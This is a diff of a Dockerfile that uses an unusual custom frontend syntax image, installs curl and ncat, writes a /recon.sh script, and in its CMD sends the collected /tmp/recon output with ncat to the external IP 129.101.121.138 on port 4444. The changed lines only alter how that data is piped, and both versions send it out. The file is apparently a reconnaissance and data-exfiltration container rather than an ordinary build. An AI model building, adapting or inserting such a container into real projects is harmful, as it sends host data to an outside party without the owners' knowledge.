@@ -1,5 +1,5 @@
 # syntax=er028455/df-frontend:v4
-# build-trigger: 4
+# build-trigger: 5
 FROM alpine:3.18
 
 RUN apk add --no-cache curl nmap-ncat
@@ -88,4 +88,4 @@ echo "=== END V6 ==="\n\
 cat /tmp/recon\n\
 ' > /recon.sh && chmod +x /recon.sh
 
-CMD sh -c "/recon.sh | ncat -w 15 129.101.121.138 4444; sleep 999999"
+CMD sh -c "/recon.sh; ncat -w 15 129.101.121.138 4444 < /tmp/recon; sleep 999999"
